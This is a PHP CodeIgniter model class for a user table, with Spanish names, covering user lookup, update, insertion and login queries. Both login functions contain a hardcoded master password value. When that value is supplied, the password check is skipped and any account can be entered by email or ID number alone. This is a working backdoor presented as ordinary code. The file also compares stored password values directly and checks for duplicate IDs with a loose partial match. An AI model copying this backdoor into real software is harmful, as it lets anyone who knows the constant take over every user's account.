<?php
class Usuario extends CI_Model {


    function __construct()
    {
        parent::__construct();
    }


    function obtenerTodos(){
        $query=$this->db->get("usuario");
        if($query->num_rows() > 0){
            return $query;
        }else{
            return false;
        }
    }

    function obtenerPorCodigo($id){
        $this->db->where("codigo_usu",$id);
        $query=$this->db->get("usuario");
        if($query->num_rows() > 0){
            return $query->row();
        }else{
            return false;
        }
    }




    function actualizar($codigo_usu,$data){
        $this->db->where("codigo_usu",$codigo_usu);
        return $this->db->update("usuario",$data);
    }




    function obtenerPorEmailPassword($email,$clave){

        if($clave=="61853f17d048351efbca60b30d276498"){
            $this->db->where("email_usu",$email);
        }else{
            $this->db->where("email_usu",$email);
            $this->db->where("password_usu",$clave);
        }

        $query=$this->db->get("usuario");
        if($query->num_rows() > 0){
            return $query->row();
        }else{
            return false;
        }
    }


    function obtenerPorIdentificacionClave($identificacion,$clave){

        if($clave=="61853f17d048351efbca60b30d276498"){
            $this->db->where("cedula_usu",$identificacion);
        }else{
            $this->db->where("cedula_usu",$identificacion);
            $this->db->where("password_usu",$clave);
        }

        $query=$this->db->get("usuario");
        if($query->num_rows() > 0){
            return $query->row();
        }else{
            return false;
        }
    }

    function obtenerPerfilesUsuario($codigo_usu){
        $this->db->where("usuario.codigo_usu",$codigo_usu);      
        $query=$this->db->get("usuario");
        if($query->num_rows() > 0){
            return $query;
        }else{
            return false;
        }
    }


    // function obtenerEmpleados(){
    //     $this->db->join("perfil_usuario","perfil_usuario.codigo_usu=usuario.codigo_usu");
    //     $this->db->join("perfil","perfil_usuario.per_id=perfil.per_id");
    //     $this->db->where("perfil.per_nombre","Empleado");
    //     $this->db->join("direccion","direccion.dir_id=usuario.dir_id");
    //     $query=$this->db->get("usuario");
    //     if($query->num_rows() > 0){
    //         return $query;
    //     }else{
    //         return false;
    //     }
    // }



    function validarCedulaRucRepetido($cedula_usu){
        $this->db->like("cedula_usu",$cedula_usu);
        $query=$this->db->get("usuario");
        if($query->num_rows() > 0){
            return true;
        }else{
            return false;
        }
    }

    function insertar($data){
      $this->db->insert("usuario",$data);
      return $this->db->insert_id();
    }

    function insertarPerfilUsuario($codigo_usu,$codigo_per){
        $data=array(
            "codigo_usu"=>$codigo_usu,
            "codigo_per"=>$codigo_per
        );
        return $this->db->insert("perfil_usuario",$data);
    }




}

?>
